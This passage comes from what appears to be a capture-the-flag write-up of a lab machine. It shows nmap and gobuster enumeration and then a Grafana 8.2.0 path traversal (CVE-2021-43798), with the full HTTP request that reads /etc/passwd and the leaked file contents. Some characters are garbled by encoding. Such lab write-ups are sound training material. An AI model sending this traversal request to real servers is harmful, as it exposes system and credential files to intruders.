+</span></span></span><span class=line><span class=cl><span class=s2>SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20Bad\x20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>FourOhFourRequest,1A1,<span class=s2>&#34;HTTP/1\.0\x20302\x20Found\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
+</span></span></span><span class=line><span class=cl><span class=s2>SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
+</span></span></span><span class=line><span class=cl><span class=s2>SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20mode=block\r\nDate:\x20Thu,\x2026\x20Jan\x202023\x2009:07:55\x20GMT
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\&#34;/login\&#34;&gt;Found&lt;/a&gt;\.\n\n&#34;</span>
+</span></span><span class=line><span class=cl>SF:<span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 117.24 seconds
+</span></span><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -o nmap/initial 10.10.11.183
+</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-01-26 20:07 AEDT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.183
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.022s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>996</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Ambassador Development Server
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-generator: Hugo 0.94.2
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>3000/tcp open  ppp?
+</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>302</span> Found
+</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
+</span></span><span class=line><span class=cl><span class=p>|</span>     Expires: -1
+</span></span><span class=line><span class=cl><span class=p>|</span>     Location: /login
+</span></span><span class=line><span class=cl><span class=p>|</span>     Pragma: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Set-Cookie: <span class=nv>redirect_to</span><span class=o>=</span>%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak<span class=p>;</span> <span class=nv>Path</span><span class=o>=</span>/<span class=p>;</span> HttpOnly<span class=p>;</span> <span class=nv>SameSite</span><span class=o>=</span>Lax
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Content-Type-Options: nosniff
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Frame-Options: deny
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Xss-Protection: 1<span class=p>;</span> <span class=nv>mode</span><span class=o>=</span>block
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Thu, <span class=m>26</span> Jan <span class=m>2023</span> 09:07:55 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>29</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/login&#34;</span>&gt;Found&lt;/a&gt;.
+</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> Bad Request
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>     Request
+</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>302</span> Found
+</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
+</span></span><span class=line><span class=cl><span class=p>|</span>     Expires: -1
+</span></span><span class=line><span class=cl><span class=p>|</span>     Location: /login
+</span></span><span class=line><span class=cl><span class=p>|</span>     Pragma: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Set-Cookie: <span class=nv>redirect_to</span><span class=o>=</span>%2F<span class=p>;</span> <span class=nv>Path</span><span class=o>=</span>/<span class=p>;</span> HttpOnly<span class=p>;</span> <span class=nv>SameSite</span><span class=o>=</span>Lax
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Content-Type-Options: nosniff
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Frame-Options: deny
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Xss-Protection: 1<span class=p>;</span> <span class=nv>mode</span><span class=o>=</span>block
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Thu, <span class=m>26</span> Jan <span class=m>2023</span> 09:07:24 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>29</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/login&#34;</span>&gt;Found&lt;/a&gt;.
+</span></span><span class=line><span class=cl><span class=p>|</span>   HTTPOptions: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>302</span> Found
+</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Expires: -1
+</span></span><span class=line><span class=cl><span class=p>|</span>     Location: /login
+</span></span><span class=line><span class=cl><span class=p>|</span>     Pragma: no-cache
+</span></span><span class=line><span class=cl><span class=p>|</span>     Set-Cookie: <span class=nv>redirect_to</span><span class=o>=</span>%2F<span class=p>;</span> <span class=nv>Path</span><span class=o>=</span>/<span class=p>;</span> HttpOnly<span class=p>;</span> <span class=nv>SameSite</span><span class=o>=</span>Lax
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Content-Type-Options: nosniff
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Frame-Options: deny
+</span></span><span class=line><span class=cl><span class=p>|</span>     X-Xss-Protection: 1<span class=p>;</span> <span class=nv>mode</span><span class=o>=</span>block
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Thu, <span class=m>26</span> Jan <span class=m>2023</span> 09:07:30 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Content-Length: <span class=m>0</span>
+</span></span><span class=line><span class=cl>3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
+</span></span><span class=line><span class=cl><span class=p>|</span>_sslv2: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> mysql-info: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   Protocol: <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Version: 8.0.30-0ubuntu0.20.04.2
+</span></span><span class=line><span class=cl><span class=p>|</span>   Thread ID: <span class=m>22</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Capabilities flags: <span class=m>65535</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Some Capabilities: Support41Auth, FoundRows, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, SupportsTransactions, LongPassword, Speaks41ProtocolOld, InteractiveClient, ConnectWithDatabase, SupportsCompression, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+</span></span><span class=line><span class=cl><span class=p>|</span>   Status: Autocommit
+</span></span><span class=line><span class=cl><span class=p>|</span>   Salt: edl<span class=se>\x</span>1CrF<span class=se>\K</span>Y<span class=se>\x</span>06<span class=p>&amp;</span>D?WD<span class=se>\x</span>12<span class=o>[</span>FEj
+</span></span><span class=line><span class=cl><span class=p>|</span>_  Auth Plugin Name: caching_sha2_password
+</span></span><span class=line><span class=cl><span class=p>|</span>_tls-alpn: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-cert: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_tls-nextprotoneg: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class=line><span class=cl>SF-Port3000-TCP:V<span class=o>=</span>7.92%I<span class=o>=</span>7%D<span class=o>=</span>1/26%Time<span class=o>=</span>63D242CD%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>Ge
+</span></span><span class=line><span class=cl>SF:nericLines,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>GetRequest,174,<span class=s2>&#34;HTTP/1\.0\x20302\x20Found\r\nCache-Contro
+</span></span></span><span class=line><span class=cl><span class=s2>SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
+</span></span></span><span class=line><span class=cl><span class=s2>SF🇪🇸\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
+</span></span></span><span class=line><span class=cl><span class=s2>SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ion:\x201;\x20mode=block\r\nDate:\x20Thu,\x2026\x20Jan\x202023\x2009:07
+</span></span></span><span class=line><span class=cl><span class=s2>SF::24\x20GMT\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\&#34;/login\&#34;&gt;Found&lt;
+</span></span></span><span class=line><span class=cl><span class=s2>SF:/a&gt;\.\n\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>Help,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
+</span></span></span><span class=line><span class=cl><span class=s2>SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20Bad\x20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>HTTPOptions,12E,<span class=s2>&#34;HTTP/1\.0\x20302\x20Found\r\nCac
+</span></span></span><span class=line><span class=cl><span class=s2>SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
+</span></span></span><span class=line><span class=cl><span class=s2>SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
+</span></span></span><span class=line><span class=cl><span class=s2>SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Th
+</span></span></span><span class=line><span class=cl><span class=s2>SF:u,\x2026\x20Jan\x202023\x2009:07:30\x20GMT\r\nContent-Length:\x200\r\n\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>RTSPRequest,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20Bad\x20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>SSLSessionReq,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Req
+</span></span></span><span class=line><span class=cl><span class=s2>SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0close\r\n\r\n400\x20Bad\x20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>TerminalServerCookie,67,<span class=s2>&#34;HTTP/1
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
+</span></span></span><span class=line><span class=cl><span class=s2>SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>TLSSess
+</span></span><span class=line><span class=cl>SF:ionReq,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+</span></span></span><span class=line><span class=cl><span class=s2>SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+</span></span></span><span class=line><span class=cl><span class=s2>SF:quest&#34;</span><span class=o>)</span>%r<span class=o>(</span>Kerberos,67,<span class=s2>&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
+</span></span></span><span class=line><span class=cl><span class=s2>SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20Bad\x20Request&#34;</span><span class=o>)</span>%r<span class=o>(</span>FourOhFourRequest,1A1,<span class=s2>&#34;HTTP/1\.0\x20302\x20Found\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
+</span></span></span><span class=line><span class=cl><span class=s2>SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
+</span></span></span><span class=line><span class=cl><span class=s2>SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20mode=block\r\nDate:\x20Thu,\x2026\x20Jan\x202023\x2009:07:55\x20GMT
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\&#34;/login\&#34;&gt;Found&lt;/a&gt;\.\n\n&#34;</span>
+</span></span><span class=line><span class=cl>SF:<span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 117.24 seconds
+</span></span></code></pre></td></tr></table></div></div><p>The web server shows us the following:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-26-20-12-17-image.png data-srcset="./assets/2023-01-26-20-12-17-image.png, ./assets/2023-01-26-20-12-17-image.png 1.5x, ./assets/2023-01-26-20-12-17-image.png 2x" data-sizes=auto alt=./assets/2023-01-26-20-12-17-image.png title=./assets/2023-01-26-20-12-17-image.png></p><p>Gobuster scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$gobuster dir -u &#34;http://10.10.11.183/&#34; -w /usr/share/wordlists/dirb/big.txt 
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2023/01/26 20:13:15 Starting gobuster in directory enumeration mode
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>/.htaccess            (Status: 403) [Size: 277]
+</span></span><span class=line><span class=cl>/.htpasswd            (Status: 403) [Size: 277]
+</span></span><span class=line><span class=cl>/categories           (Status: 301) [Size: 317] [--&gt; http://10.10.11.183/categories/]
+</span></span><span class=line><span class=cl>/images               (Status: 301) [Size: 313] [--&gt; http://10.10.11.183/images/]    
+</span></span><span class=line><span class=cl>/posts                (Status: 301) [Size: 312] [--&gt; http://10.10.11.183/posts/]     
+</span></span><span class=line><span class=cl>/server-status        (Status: 403) [Size: 277]                                      
+</span></span><span class=line><span class=cl>/sitemap.xml          (Status: 200) [Size: 645]                                      
+</span></span><span class=line><span class=cl>/tags                 (Status: 301) [Size: 311] [--&gt; http://10.10.11.183/tags/] 
+</span></span></code></pre></td></tr></table></div></div><p>http://10.10.11.183:3000/ shows a grafana login page:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-26-20-15-36-image.png data-srcset="./assets/2023-01-26-20-15-36-image.png, ./assets/2023-01-26-20-15-36-image.png 1.5x, ./assets/2023-01-26-20-15-36-image.png 2x" data-sizes=auto alt=./assets/2023-01-26-20-15-36-image.png title=./assets/2023-01-26-20-15-36-image.png></p><p>Port 3306 appears to be MySQL 8.0.30-0ubuntu0.20.04.2</p><p>Let&rsquo;s try enumerating mysql using nmap scripts:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sV -o mysql.txt -p <span class=m>3306</span> --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.11.183
+</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-01-26 20:19 AEDT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.183
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.021s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
+</span></span><span class=line><span class=cl><span class=p>|</span> mysql-info: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   Protocol: <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Version: 8.0.30-0ubuntu0.20.04.2
+</span></span><span class=line><span class=cl><span class=p>|</span>   Thread ID: <span class=m>32</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Capabilities flags: <span class=m>65535</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Some Capabilities: IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, SupportsLoadDataLocal, LongPassword, SupportsTransactions, SwitchToSSLAfterHandshake, InteractiveClient, Speaks41ProtocolNew, ODBCClient, FoundRows, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+</span></span><span class=line><span class=cl><span class=p>|</span>   Status: Autocommit
+</span></span><span class=line><span class=cl><span class=p>|</span>   Salt: wG&gt;f<span class=o>[</span>9j<span class=se>\x</span>199hxQZ<span class=se>\x</span>19<span class=o>}</span><span class=se>\x</span>10w%<span class=se>\x</span>06?
+</span></span><span class=line><span class=cl><span class=p>|</span>_  Auth Plugin Name: caching_sha2_password
+</span></span><span class=line><span class=cl><span class=p>|</span>_mysql-empty-password: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_mysql-vuln-cve2012-2122: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> mysql-enum: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   Accounts: No valid accounts found
+</span></span><span class=line><span class=cl><span class=p>|</span>   Statistics: Performed <span class=m>0</span> guesses in <span class=m>6</span> seconds, average tps: 0.0
+</span></span><span class=line><span class=cl><span class=p>|</span>_  ERROR: The service seems to have failed or is heavily firewalled...
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 16.05 seconds
+</span></span></code></pre></td></tr></table></div></div><h2 id=foothold>Foothold</h2><p>The login page for Grafana shows v8.2.0, and after a very quick search, I discover <a href=https://github.com/jas502n/Grafana-CVE-2021-43798 target=_blank rel="noopener noreffer">GitHub - jas502n/Grafana-CVE-2021-43798: Grafana Unauthorized arbitrary file reading vulnerability</a></p><p>Now, copying the <code>GET /login</code> HTTP request for the page into Burp Suite&rsquo;s repeater, and trying the very first URL for path traversal to see if we can traverse back to the root of the file system, and read <code>/etc/passwd</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /public/plugins/alertGroups/../../../../../../../../etc/passwd HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 10.10.11.183:3000
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Cookie: redirect_to=%2Fpublic%2Fplugins%2Falertlist%2F
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span></code></pre></td></tr></table></div></div><p>we are successful - here&rsquo;s the response showing <code>/etc/passwd</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
+</span></span><span class=line><span class=cl>Accept-Ranges: bytes
+</span></span><span class=line><span class=cl>Cache-Control: no-cache
+</span></span><span class=line><span class=cl>Content-Length: 1983
+</span></span><span class=line><span class=cl>Content-Type: text/plain; charset=utf-8
+</span></span><span class=line><span class=cl>Expires: -1
+</span></span><span class=line><span class=cl>Last-Modified: Mon, 14 Mar 2022 02:56:37 GMT
+</span></span><span class=line><span class=cl>Pragma: no-cache
+</span></span><span class=line><span class=cl>X-Content-Type-Options: nosniff
+</span></span><span class=line><span class=cl>X-Frame-Options: deny
+</span></span><span class=line><span class=cl>X-Xss-Protection: 1; mode=block
+</span></span><span class=line><span class=cl>Date: Thu, 26 Jan 2023 10:03:19 GMT
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bin❌2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sys❌3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sync❌4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games❌5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>man❌6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mail❌8:8:mail:/var/mail:/usr/sbin/nologin
